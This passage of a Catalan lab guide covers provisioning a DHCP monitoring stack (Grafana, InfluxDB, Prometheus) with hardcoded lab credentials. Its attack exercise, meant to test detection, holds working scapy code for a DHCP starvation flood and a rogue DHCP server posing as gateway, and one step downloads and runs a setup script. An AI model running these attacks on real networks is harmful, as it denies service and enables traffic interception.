    mkdir -p {grafana/{dashboards,provisioning/{dashboards,datasources,alerting,notifiers}},prometheus/{rules,targets},scripts,data/{influxdb,grafana,prometheus},logs}
    
    # Permisos per Grafana (UID 472)
    sudo chown -R 472:472 data/grafana grafana/
    
    # Permisos per InfluxDB
    sudo chown -R 999:999 data/influxdb
    
    log_success "Directory structure created!"
    
    # Mostrar estructura
    if command -v tree &> /dev/null; then
        tree -L 3
    else
        find . -type d | head -20
    fi
}

# Generar fitxers de configuració
generate_configs() {
    log_info "Generating configuration files..."
    
    # Datasource configuration per Grafana
    cat > grafana/provisioning/datasources/dhcp.yml << 'EOF'
apiVersion: 1

datasources:
  - name: InfluxDB-DHCP
    type: influxdb
    access: proxy
    url: http://influxdb:8086
    jsonData:
      version: Flux
      organization: dhcplab
      defaultBucket: dhcp_metrics
      httpMode: POST
    secureJsonData:
      token: dhcp-super-secret-auth-token-2024
    isDefault: true
    editable: false

  - name: Prometheus-DHCP
    type: prometheus
    access: proxy
    url: http://prometheus:9090
    isDefault: false
    editable: false
EOF

    # Dashboard provisioning
    cat > grafana/provisioning/dashboards/dashboard.yml << 'EOF'
apiVersion: 1

providers:
  - name: 'dhcp-dashboards'
    orgId: 1
    folder: 'DHCP Monitoring'
    type: file
    disableDeletion: false
    updateIntervalSeconds: 10
    allowUiUpdates: true
    options:
      path: /var/lib/grafana/dashboards
EOF

    # Col·lector config
    cat > scripts/dhcp-collector-config.json << 'EOF'
{
    "influxdb": {
        "url": "http://localhost:8086",
        "token": "dhcp-super-secret-auth-token-2024",
        "org": "dhcplab",
        "bucket": "dhcp_metrics"
    },
    "dhcp_log_path": "/var/log/dhcp.log",
    "dhcp_leases_path": "/var/lib/dhcp/dhcpd.leases",
    "collection_interval": 60,
    "anomaly_detection": {
        "starvation_threshold": 50,
        "nak_threshold": 10,
        "pool_utilization_warning": 85,
        "pool_utilization_critical": 95
    },
    "logging": {
        "level": "INFO",
        "file": "/var/log/dhcp-collector.log"
    }
}
EOF

    log_success "Configuration files generated!"
}

# Generar dashboard JSON
generate_dashboard() {
    log_info "Generating Grafana dashboard..."
    
    cat > grafana/dashboards/dhcp-overview.json << 'EOF'
{
  "dashboard": {
    "id": null,
    "uid": "dhcp-overview-v2",
    "title": "DHCP Monitoring Overview v2",
    "description": "Comprehensive DHCP monitoring with anomaly detection",
    "tags": ["dhcp", "network", "security", "monitoring"],
    "timezone": "browser",
    "schemaVersion": 39,
    "version": 1,
    "refresh": "30s",
    "time": {
      "from": "now-1h",
      "to": "now"
    },
    "panels": [
      {
        "id": 1,
        "title": "DHCP Pool Utilization",
        "type": "stat",
        "gridPos": {"h": 8, "w": 8, "x": 0, "y": 0},
        "targets": [
          {
            "refId": "A",
            "datasource": {"type": "influxdb", "uid": "influxdb-dhcp"},
            "query": "from(bucket: \"dhcp_metrics\")\n  |> range(start: v.timeRangeStart, stop: v.timeRangeStop)\n  |> filter(fn: (r) => r[\"_measurement\"] == \"dhcp_leases\")\n  |> filter(fn: (r) => r[\"stat_type\"] == \"pool_utilization\")\n  |> last()\n  |> yield(name: \"utilization\")"
          }
        ],
        "fieldConfig": {
          "defaults": {
            "color": {"mode": "thresholds"},
            "thresholds": {
              "steps": [
                {"color": "green", "value": null},
                {"color": "yellow", "value": 70},
                {"color": "orange", "value": 85},
                {"color": "red", "value": 95}
              ]
            },
            "unit": "percent",
            "min": 0,
            "max": 100
          }
        },
        "options": {
          "orientation": "auto",
          "reduceOptions": {
            "values": false,
            "calcs": ["lastNotNull"],
            "fields": ""
          },
          "textMode": "value_and_name"
        }
      },
      {
        "id": 2,
        "title": "DHCP Events Rate (per minute)",
        "type": "timeseries",
        "gridPos": {"h": 8, "w": 16, "x": 8, "y": 0},
        "targets": [
          {
            "refId": "A",
            "datasource": {"type": "influxdb", "uid": "influxdb-dhcp"},
            "query": "from(bucket: \"dhcp_metrics\")\n  |> range(start: v.timeRangeStart, stop: v.timeRangeStop)\n  |> filter(fn: (r) => r[\"_measurement\"] == \"dhcp_events\")\n  |> filter(fn: (r) => r[\"_field\"] == \"count\")\n  |> aggregateWindow(every: 1m, fn: sum, createEmpty: false)\n  |> group(columns: [\"metric_type\"])\n  |> yield(name: \"events\")"
          }
        ],
        "options": {
          "legend": {"displayMode": "table", "placement": "right", "values": ["last", "max"]},
          "tooltip": {"mode": "multi", "sort": "desc"}
        }
      },
      {
        "id": 3,
        "title": "Active vs Available Addresses",
        "type": "piechart",
        "gridPos": {"h": 8, "w": 8, "x": 0, "y": 8},
        "targets": [
          {
            "refId": "A",
            "datasource": {"type": "influxdb", "uid": "influxdb-dhcp"},
            "query": "active = from(bucket: \"dhcp_metrics\")\n  |> range(start: v.timeRangeStart, stop: v.timeRangeStop)\n  |> filter(fn: (r) => r[\"_measurement\"] == \"dhcp_leases\")\n  |> filter(fn: (r) => r[\"stat_type\"] == \"active_leases\")\n  |> last()\n  |> map(fn: (r) => ({ _time: r._time, _value: r._value, _field: \"Active\" }))\n\navailable = from(bucket: \"dhcp_metrics\")\n  |> range(start: v.timeRangeStart, stop: v.timeRangeStop)\n  |> filter(fn: (r) => r[\"_measurement\"] == \"dhcp_leases\")\n  |> filter(fn: (r) => r[\"stat_type\"] == \"addresses_available\")\n  |> last()\n  |> map(fn: (r) => ({ _time: r._time, _value: r._value, _field: \"Available\" }))\n\nunion(tables: [active, available])\n  |> group(columns: [\"_field\"])\n  |> sum()\n  |> yield(name: \"addresses\")"
          }
        ],
        "options": {
          "reduceOptions": {"values": false, "calcs": ["lastNotNull"]},
          "pieType": "donut",
          "tooltip": {"mode": "single", "sort": "none"},
          "legend": {"displayMode": "table", "placement": "right"}
        }
      },
      {
        "id": 4,
        "title": "Recent DHCP Anomalies",
        "type": "table",
        "gridPos": {"h": 8, "w": 16, "x": 8, "y": 8},
        "targets": [
          {
            "refId": "A",
            "datasource": {"type": "influxdb", "uid": "influxdb-dhcp"},
            "query": "from(bucket: \"dhcp_metrics\")\n  |> range(start: v.timeRangeStart, stop: v.timeRangeStop)\n  |> filter(fn: (r) => r[\"_measurement\"] == \"dhcp_anomalies\")\n  |> sort(columns: [\"_time\"], desc: true)\n  |> limit(n: 20)\n  |> keep(columns: [\"_time\", \"anomaly_type\", \"severity\", \"description\", \"value\"])\n  |> yield(name: \"anomalies\")"
          }
        ],
        "transformations": [
          {
            "id": "organize",
            "options": {
              "excludeByName": {"_start": true, "_stop": true},
              "indexByName": {"_time": 0, "anomaly_type": 1, "severity": 2, "description": 3, "value": 4},
              "renameByName": {
                "_time": "Time",
                "anomaly_type": "Type",
                "severity": "Severity", 
                "description": "Description",
                "value": "Value"
              }
            }
          }
        ],
        "options": {
          "showHeader": true,
          "sortBy": [{"desc": true, "displayName": "Time"}]
        },
        "fieldConfig": {
          "overrides": [
            {
              "matcher": {"id": "byName", "options": "Severity"},
              "properties": [
                {
                  "id": "custom.cellOptions",
                  "value": {"type": "color-background"}
                },
                {
                  "id": "color",
                  "value": {"mode": "thresholds"}
                },
                {
                  "id": "thresholds",
                  "value": {
                    "steps": [
                      {"color": "green", "value": null},
                      {"color": "yellow", "value": "medium"},
                      {"color": "orange", "value": "high"},
                      {"color": "red", "value": "critical"}
                    ]
                  }
                }
              ]
            }
          ]
        }
      },
      {
        "id": 5,
        "title": "Scope Utilization Breakdown",
        "type": "bargauge",
        "gridPos": {"h": 8, "w": 12, "x": 0, "y": 16},
        "targets": [
          {
            "refId": "A",
            "datasource": {"type": "influxdb", "uid": "influxdb-dhcp"},
            "query": "from(bucket: \"dhcp_metrics\")\n  |> range(start: v.timeRangeStart, stop: v.timeRangeStop)\n  |> filter(fn: (r) => r[\"_measurement\"] == \"dhcp_scopes\")\n  |> filter(fn: (r) => r[\"metric\"] == \"utilization\")\n  |> last()\n  |> group(columns: [\"scope\"])\n  |> yield(name: \"scope_utilization\")"
          }
        ],
        "options": {
          "orientation": "horizontal",
          "displayMode": "gradient"
        },
        "fieldConfig": {
          "defaults": {
            "color": {"mode": "thresholds"},
            "thresholds": {
              "steps": [
                {"color": "green", "value": null},
                {"color": "yellow", "value": 70},
                {"color": "red", "value": 85}
              ]
            },
            "unit": "percent",
            "min": 0,
            "max": 100
          }
        }
      },
      {
        "id": 6,
        "title": "DHCP Server Performance",
        "type": "stat",
        "gridPos": {"h": 8, "w": 12, "x": 12, "y": 16},
        "targets": [
          {
            "refId": "A",
            "datasource": {"type": "influxdb", "uid": "influxdb-dhcp"},
            "query": "from(bucket: \"dhcp_metrics\")\n  |> range(start: v.timeRangeStart, stop: v.timeRangeStop)\n  |> filter(fn: (r) => r[\"_measurement\"] == \"dhcp_events\")\n  |> filter(fn: (r) => r[\"metric_type\"] == \"acks\" or r[\"metric_type\"] == \"discovers\")\n  |> aggregateWindow(every: 5m, fn: sum)\n  |> pivot(rowKey:[\"_time\"], columnKey: [\"metric_type\"], valueColumn: \"_value\")\n  |> map(fn: (r) => ({ _time: r._time, success_rate: if exists r.discovers and r.discovers > 0 then float(v: r.acks) / float(v: r.discovers) * 100.0 else 0.0 }))\n  |> mean(column: \"success_rate\")\n  |> yield(name: \"success_rate\")"
          }
        ],
        "fieldConfig": {
          "defaults": {
            "color": {"mode": "thresholds"},
            "thresholds": {
              "steps": [
                {"color": "red", "value": null},
                {"color": "yellow", "value": 70},
                {"color": "green", "value": 90}
              ]
            },
            "unit": "percent"
          }
        },
        "options": {
          "colorMode": "background",
          "graphMode": "area",
          "justifyMode": "center",
          "orientation": "horizontal"
        }
      }
    ]
  }
}
EOF

    log_success "Dashboard generated!"
}

# Iniciar serveis
start_services() {
    log_info "Starting services with Docker Compose v2..."
    
    # Pull de totes les imatges primer
    docker compose pull
    
    # Iniciar serveis amb dependències
    docker compose up -d
    
    # Esperar que els serveis estiguin llestos
    log_info "Waiting for services to be ready..."
    
    # Esperar InfluxDB
    local max_attempts=30
    local attempt=1
    while [ $attempt -le $max_attempts ]; do
        if curl -s http://localhost:8086/ping > /dev/null 2>&1; then
            log_success "InfluxDB is ready!"
            break
        fi
        log_info "Waiting for InfluxDB... (attempt $attempt/$max_attempts)"
        sleep 2
        ((attempt++))
    done
    
    # Esperar Grafana
    attempt=1
    while [ $attempt -le $max_attempts ]; do
        if curl -s http://localhost:3000/api/health > /dev/null 2>&1; then
            log_success "Grafana is ready!"
            break
        fi
        log_info "Waiting for Grafana... (attempt $attempt/$max_attempts)"
        sleep 2
        ((attempt++))
    done
    
    # Mostrar estat dels serveis
    docker compose ps
}

# Verificar serveis
verify_services() {
    log_info "Verifying services..."
    
    local services=(
        "http://localhost:8086/ping:InfluxDB"
        "http://localhost:3000/api/health:Grafana"
        "http://localhost:9090/-/healthy:Prometheus"
    )
    
    for service in "${services[@]}"; do
        local url="${service%:*}"
        local name="${service#*:}"
        
        if curl -s -f "$url" > /dev/null; then
            log_success "$name is healthy"
        else
            log_error "$name is not responding"
        fi
    done
}

# Mostrar informació final
show_final_info() {
    log_success "🎉 DHCP Monitoring Lab setup completed successfully!"
    echo
    echo "📊 Service URLs:"
    echo "  • Grafana:    http://localhost:3000 (admin/DHCPAdmin2024!)"
    echo "  • InfluxDB:   http://localhost:8086 (admin/DHCPLab2024!)"
    echo "  • Prometheus: http://localhost:9090"
    echo "  • Alertmanager: http://localhost:9093"
    echo
    echo "📝 Useful commands:"
    echo "  • View logs:     docker compose logs -f [service_name]"
    echo "  • Stop all:      docker compose down"
    echo "  • Start all:     docker compose up -d"
    echo "  • Restart:       docker compose restart [service_name]"
    echo
    echo "📁 Configuration files are in:"
    echo "  • Grafana:    ./grafana/provisioning/"
    echo "  • Prometheus: ./prometheus/"
    echo "  • Scripts:    ./scripts/"
    echo
    log_info "Don't forget to start the DHCP collector script!"
}

# Funció de cleanup en cas d'error
cleanup_on_error() {
    log_error "Setup failed. Cleaning up..."
    docker compose down 2>/dev/null || true
    exit 1
}

# Trap per cleanup
trap cleanup_on_error ERR

# Main execution
main() {
    log_info "Starting DHCP Monitoring Lab setup with Docker Compose v2"
    
    check_prerequisites
    setup_directories
    generate_configs
    generate_dashboard
    start_services
    verify_services
    show_final_info
}

# Executar script principal
main "$@"
```

### 3.2 Comandaments Docker Compose v2

```bash
# Comandaments bàsics amb Docker Compose v2

# Iniciar tots els serveis
docker compose up -d

# Veure logs en temps real
docker compose logs -f

# Veure logs d'un servei específic
docker compose logs -f grafana

# Aturar tots els serveis
docker compose down

# Aturar i eliminar volums (DATA LOSS!)
docker compose down -v

# Reiniciar un servei específic
docker compose restart influxdb

# Escalar un servei (si és aplicable)
docker compose up -d --scale dhcp-exporter=2

# Veure estat dels serveis
docker compose ps

# Executar comandes dins un contenidor
docker compose exec grafana bash
docker compose exec influxdb influx

# Actualitzar només un servei
docker compose up -d grafana

# Veure ús de recursos
docker compose top

# Validar configuració
docker compose config

# Parar un servei específic sense eliminar-lo
docker compose stop grafana

# Iniciar un servei parat
docker compose start grafana

# Rebuilding services (si has canviat Dockerfiles)
docker compose build
docker compose up -d --build
```

---

## Fase 4: Exercicis Pràctics Actualitzats

### 4.1 Exercici 1: Desplegament Complet

```bash
# Execució pas a pas del setup

# 1. Descarregar i executar script d'instal·lació
wget -O setup_dhcp_monitoring_v2.sh https://example.com/setup_dhcp_monitoring_v2.sh
chmod +x setup_dhcp_monitoring_v2.sh
./setup_dhcp_monitoring_v2.sh

# 2. Verificar que tots els serveis estan funcionant
docker compose ps
docker compose logs --tail=50

# 3. Accedir a Grafana i verificar datasources
curl -u admin:DHCPAdmin2024! http://localhost:3000/api/datasources

# 4. Executar el col·lector de mètriques
cd scripts
pip install -r requirements.txt
python3 dhcp_collector_linux_v2.py

# 5. Verificar mètriques a InfluxDB
curl -H "Authorization: Token dhcp-super-secret-auth-token-2024" \
     "http://localhost:8086/api/v2/query?org=dhcplab" \
     --data-urlencode 'query=from(bucket:"dhcp_metrics") |> range(start: -1h) |> limit(n:10)'
```

### 4.2 Exercici 2: Simulació d'Atacs amb Monitorització

```python
# scripts/attack_simulator_v2.py
import asyncio
import aiohttp
from scapy.all import *
import random
import time

class DHCPAttackSimulator:
    def __init__(self, interface="eth0", target_network="192.168.100.0/24"):
        self.interface = interface
        self.target_network = target_network
        self.attack_active = False
        
    async def simulate_starvation_attack(self, duration_minutes=5, intensity="medium"):
        """Simula atac de DHCP starvation"""
        intensities = {
            "low": 10,     # 10 requests per minut
            "medium": 50,  # 50 requests per minut  
            "high": 100    # 100 requests per minut
        }
        
        requests_per_minute = intensities.get(intensity, 50)
        interval = 60 / requests_per_minute
        
        print(f"🚨 Starting DHCP starvation attack ({intensity} intensity)")
        print(f"📊 Rate: {requests_per_minute} requests/minute for {duration_minutes} minutes")
        
        self.attack_active = True
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        
        attack_count = 0
        
        while time.time() < end_time and self.attack_active:
            # Generar MAC aleatòria
            fake_mac = self._generate_random_mac()
            
            # Crear paquet DHCP DISCOVER
            try:
                dhcp_discover = self._create_dhcp_discover(fake_mac)
                sendp(dhcp_discover, iface=self.interface, verbose=0)
                attack_count += 1
                
                if attack_count % 10 == 0:
                    print(f"📡 Sent {attack_count} malicious DHCP requests...")
                
            except Exception as e:
                print(f"❌ Error sending packet: {e}")
            
            await asyncio.sleep(interval)
        
        print(f"✅ Attack simulation completed. Total requests sent: {attack_count}")

    async def simulate_rogue_dhcp_server(self, duration_minutes=3):
        """Simula un servidor DHCP maliciós"""
        print("🏴‍☠️ Starting rogue DHCP server simulation")
        
        # Configurar servidor DHCP fals
        rogue_config = {
            "server_ip": "192.168.100.254",
            "dns_server": "8.8.8.8",  # DNS legítim per evitar suspites
            "gateway": "192.168.100.254",  # Gateway maliciós (nosaltres)
            "lease_time": 86400
        }
        
        self.attack_active = True
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        
        # Escoltar per DHCP DISCOVER packets
        def handle_dhcp_discover(packet):
            if not self.attack_active:
                return
                
            if packet.haslayer(DHCP):
                dhcp_options = packet[DHCP].options
                for option in dhcp_options:
                    if option[0] == 'message-type' and option[1] == 1:  # DISCOVER
                        # Respondre amb OFFER maliciós
                        self._send_malicious_offer(packet, rogue_config)
        
        print("👂 Listening for DHCP DISCOVER packets...")
        
        # Sniff per DHCP traffic
        sniff_task = asyncio.create_task(
            self._async_sniff(handle_dhcp_discover, end_time)
        )
        
        await sniff_task
        print("✅ Rogue DHCP server simulation completed")

    def _generate_random_mac(self):
        """Genera una adreça MAC aleatòria"""
        return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

    def _create_dhcp_discover(self, mac_address):
        """Crea un paquet DHCP DISCOVER"""
        mac_raw = mac_address.replace(":", "")
        mac_bytes = bytes.fromhex(mac_raw)
        
        return (Ether(dst="ff:ff:ff:ff:ff:ff", src=mac_address) /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac_bytes, xid=random.randint(1, 2**32-1)) /
                DHCP(options=[("message-type", "discover"), "end"]))

    def _send_malicious_offer(self, discover_packet, config):
        """Envia una resposta DHCP OFFER maliciosa"""
        client_mac = discover_packet[Ether].src
        xid = discover_packet[BOOTP].xid
        
        # Generar IP per oferir
        offered_ip = f"192.168.100.{random.randint(10, 100)}"
        
        offer_packet = (Ether(dst=client_mac, src="00:0c:29:xx:xx:xx") /
                       IP(src=config["server_ip"], dst="255.255.255.255") /
                       UDP(sport=67, dport=68) /
                       BOOTP(op=2, yiaddr=offered_ip, siaddr=config["server_ip"],
                             chaddr=discover_packet[BOOTP].chaddr, xid=xid) /
                       DHCP(options=[("message-type", "offer"),
                                   ("server_id", config["server_ip"]),
                                   ("lease_time", config["lease_time"]),
                                   ("subnet_mask", "255.255.255.0"),
                                   ("router", config["gateway"]),
                                   ("name_server", config["dns_server"]),
                                   "end"]))
        
        sendp(offer_packet, iface=self.interface, verbose=0)
        print(f"🎭 Sent malicious OFFER: {offered_ip} to {client_mac}")

    async def _async_sniff(self, handler, end_time):
        """Sniffing asíncron de paquets"""
        def stop_filter(packet):
            return time.time() >= end_time
        
        # Executar sniff en un executor separat per evitar bloquejar
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(
            None, 
            lambda: sniff(iface=self.interface, filter="port 67 or port 68", 
                         prn=handler, stop_filter=stop_filter, timeout=300)
        )

    def stop_attack(self):
        """Atura l'atac en curs"""
        self.attack_active = False
        print("🛑 Attack simulation stopped")

async def main():
    print("🧪 DHCP Attack Simulator v2")
    print("⚠️  WARNING: Only use in authorized lab environments!")
    
    simulator = DHCPAttackSimulator(interface="eth0")
    
    try:
        print("\n1. Starting DHCP starvation attack...")
        await simulator.simulate_starvation_attack(duration_minutes=2, intensity="medium")
        
        print("\n2. Waiting 30 seconds before next attack...")
        await asyncio.sleep(30)
        
        print("\n3. Starting rogue DHCP server simulation...")
        await simulator.simulate_rogue_dhcp_server(duration_minutes=2)
        
    except KeyboardInterrupt:
        print("\n🛑 Simulation interrupted by user")
        simulator.stop_attack()

if __name__ == "__main__":
    # NOMÉS PER ENTORNS DE LABORATORI!
    asyncio.run(main())
```

---

## Recursos i Troubleshooting

### Troubleshooting Docker Compose v2

```bash
# Problemes comuns i solucions

# 1. Servei no inicia
docker compose ps
docker compose logs [service_name]

# 2. Problema de permisos amb volums
sudo chown -R $USER:$USER data/
docker compose restart

# 3. Port ja en ús
docker compose down
sudo lsof -i :3000  # Trobar procés que usa el port
sudo kill -9 [PID]
docker compose up -d

# 4. Problemes de xarxa
docker network ls
docker network inspect dhcp_monitoring

# 5. Cleanup complet
docker compose down -v --remove-orphans
docker system prune -f
docker volume prune -f

# 6. Verificar configuració
docker compose config --quiet  # No output = config OK

# 7. Reconstruir serveis
docker compose build --no-cache
docker compose up -d --force-recreate

# 8. Debug d'un servei específic
docker compose run --rm grafana /bin/bash
```

### Scripts d'Automatització Addicionals

```bash
# scripts/health_check.sh
#!/bin/bash

echo "🔍 DHCP Monitoring Health Check"

# Verificar Docker Compose
if docker compose ps | grep -q "Up"; then
    echo "✅ Docker Compose services are running"
else
    echo "❌ Some Docker Compose services are down"
    docker compose ps
fi

# Verificar connectivitat
services=(
    "http://localhost:3000/api/health:Grafana"
    "http://localhost:8086/ping:InfluxDB"  
    "http://localhost:9090/-/healthy:Prometheus"
)

for service in "${services[@]}"; do
    url="${service%:*}"
    name="${service#*:}"
    
    if curl -s -f "$url" > /dev/null; then
        echo "✅ $name is healthy"
    else
        echo "❌ $name is not responding"
    fi
done

# Verificar mètriques recents
echo "📊 Checking recent metrics..."
response=$(curl -s -H "Authorization: Token dhcp-super-secret-auth-token-2024" \
    "http://localhost:8086/api/v2/query?org=dhcplab" \
    --data-urlencode 'query=from(bucket:"dhcp_metrics") |> range(start: -5m) |> count()')

if [[ $response == *"_value"* ]]; then
    echo "✅ Recent metrics found in InfluxDB"
else
    echo "⚠️  No recent metrics in InfluxDB"
fi
```

